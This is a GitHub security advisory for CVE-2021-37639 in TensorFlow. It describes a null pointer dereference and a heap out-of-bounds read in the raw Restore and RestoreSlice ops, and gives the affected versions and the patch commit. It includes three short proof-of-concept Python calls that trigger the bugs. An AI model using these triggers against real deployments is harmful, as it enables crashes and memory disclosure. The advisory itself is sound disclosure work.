# [H] Null pointer dereference and heap OOB read in operations restoring tensors

## Summary
Severity: High
Advisory: GHSA-gh6x-4whr-2qv4
CVE: CVE-2021-37639
CWE: CWE-125, CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-gh6x-4whr-2qv4
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
When restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:

```python
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=[], 
  default_value=21,
  dt=tf.int,
  preferred_shard=1)
```
  
The same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:
  
```python
import tensorflow as tf

tf.raw_ops.RestoreSlice(
  file_pattern=['/tmp'],
  tensor_name=[], 
  shape_and_slice='2',
  dt=inp.array([tf.int]),
  preferred_shard=1)
```

Alternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:

```python
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=['x'], 
  default_value=21,
  dt=tf.int,
  preferred_shard=42)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.

If the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.

### Patches 
We have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4
- https://nvd.nist.gov/vuln/detail/CVE-2021-37639
- https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-552.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-750.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-261.yaml
- https://github.com/tensorflow/tensorflow
